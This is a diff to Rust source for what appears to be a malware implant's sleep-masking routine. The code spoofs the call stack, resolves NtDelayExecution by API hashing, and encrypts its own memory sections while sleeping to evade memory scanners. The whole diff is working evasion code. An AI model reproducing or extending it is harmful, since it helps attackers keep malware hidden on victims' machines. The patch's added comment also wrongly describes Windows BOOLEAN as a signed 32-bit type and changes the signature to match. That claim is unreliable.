@@ -38,19 +38,21 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                 spoof::spoof_stack();
 
                 let duration_100ns = -(duration.as_nanos() as i64 / 100);
-                let delay = duration_100ns;
+                let mut delay = duration_100ns;
                 
                 let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
                 let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(ntdll.unwrap_or(0), pe_resolve::hash_str(b"NtDelayExecution\0")).unwrap_or(0);
                 let addr = nt_delay_execution_addr as *const ();
                 if !addr.is_null() {
-                    let function: extern "system" fn(u8, *const i64) -> i32 = std::mem::transmute(addr);
-                    function(0, &delay);
-                }
-
+                // Correct NtDelayExecution signature:
+                //   NTSTATUS NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER Interval)
+                // Alertable is a signed 32-bit BOOLEAN (not u8), Interval is *mut i64.
+                let function: extern "system" fn(i32, *mut i64) -> i32 = std::mem::transmute(addr);
+                function(0, &mut delay as *mut i64);
                 spoof::restore_stack();
                 crypto::decrypt_sections();
-            }
+                } // close if !addr.is_null()
+            } // close unsafe
             #[cfg(not(target_arch = "x86_64"))]
             std::thread::sleep(duration);
             Ok(())
@@ -299,8 +301,10 @@ pub mod crypto {
                 libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
-                // Encrypted: no permissions during sleep window (issue 5.1)
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_NONE);
+                // Encrypted: keep PROT_READ during sleep so signal handlers can
+                // still read (but not execute) this region.  PROT_NONE would cause
+                // SIGSEGV if any signal arrives while the section is unmapped.
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ);
             }
         }
     }
